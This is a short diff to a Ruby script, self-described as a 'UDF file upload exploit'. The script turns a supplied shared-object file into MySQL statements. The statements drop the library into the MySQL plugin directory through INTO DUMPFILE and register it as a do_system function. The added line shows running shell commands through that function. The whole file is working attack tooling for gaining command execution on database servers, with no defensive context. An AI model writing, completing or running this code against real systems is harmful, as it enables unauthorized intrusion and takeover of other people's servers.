@@ -2,7 +2,6 @@
 #unpacks data for UDF file upload exploit
 require 'securerandom'
 
-
 #pass me the .so file you created
 soname = SecureRandom.alphanumeric(8)
 data = File.read(ARGV[0])
@@ -12,3 +11,4 @@ puts "SELECT #{blob} into DUMPFILE '/usr/lib/mysql/plugin/#{soname}.so';"
 puts "DROP FUNCTION IF EXISTS sys_exec;"
 puts "CREATE FUNCTION do_system RETURNS int SONAME '#{soname}.so';"
 puts "select * from mysql.func where name = 'do_system';"
+puts "Execute commands like this: select do_system('touch /tmp/file.txt'); "
